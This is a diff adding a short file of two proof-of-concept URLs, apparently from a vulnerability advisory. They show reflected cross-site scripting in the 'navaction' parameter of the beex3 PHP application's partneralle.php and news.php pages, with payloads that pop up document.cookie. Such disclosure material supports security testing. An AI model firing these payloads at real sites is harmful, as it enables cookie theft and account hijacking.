@@ -1,0 +1,3 @@
+http://www.example.com/demos/beex3/partneralle.php?page=1&navaction=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/demos/beex3/news.php?page=1&Sortieren=0&navaction=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+
